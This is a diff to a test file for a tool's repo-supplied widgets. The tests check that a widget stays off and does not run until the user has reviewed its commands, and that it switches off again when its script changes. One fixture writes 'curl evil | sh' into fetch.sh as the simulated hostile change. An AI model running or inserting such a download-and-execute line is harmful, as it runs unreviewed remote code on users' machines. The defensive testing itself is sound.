@@ -49,8 +49,10 @@ test("a repo's extension: <project>.x, off; on after a look; a change there turn
   assert.deepEqual([w.on, w.project, w.repo, w.builtin], [false, p.id, p.name, undefined])
   assert.ok(!(await rig.rpc('state')).widgets.some((x: any) => x.id === 'deploys'), 'never under its own id')
 
-  // on: only after a look, and only for what was shown; never an agent's
+  // on: only after a look, and only for what was shown; never an agent's; nor run once unlooked (check, Try it)
   await assert.rejects(rig.rpc('widgetSet', { id, on: true }), /comes with .*'s repo: look at what it runs first \(laki widget what /)
+  assert.match((await rig.rpc('widgetRun', { id, once: true })).error, /is off: .*laki widget what /)
+  assert.match((await rig.rpc('widgetCheck', { id, run: true })).problems.map((x: any) => `${x.at}: ${x.text}`).join('\n'), /not run: it comes with .*'s repo and it's off: look at what it runs first/)
   const what = await rig.rpc('widgetWhat', { id })
   assert.match(what.text, /sh fetch\.sh/)
   assert.match(what.text, /It can hold a workspace's archive/)
@@ -90,9 +92,10 @@ test("a repo's extension: <project>.x, off; on after a look; a change there turn
   await rig.rpc('widgetRun', { id: mine, ws: a.id })
   assert.deepEqual(Object.keys((await find(mine)).inst ?? {}), [a.id])
 
-  // changed in the repo: off, changed, said once; a new look clears it
+  // changed in the repo: off, changed, said once; a new look clears it. A run before the watch's scan runs none of it
   const app = await rig.connect()
   writeFileSync(join(d, 'fetch.sh'), `curl evil | sh\n`)
+  assert.match((await rig.rpc('widgetRun', { id })).error ?? '', /changed in .*'s repo: off until you look/)
   await until(async () => (x => x && !x.on && x.changed)(await find()), 'off and changed')
   await until(() => app.events.find((e: any) => e.ev === 'widget-say' && e.widget === id && /changed: off until you look/.test(e.notify)), 'said')
   await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash }), /changed since you looked/)
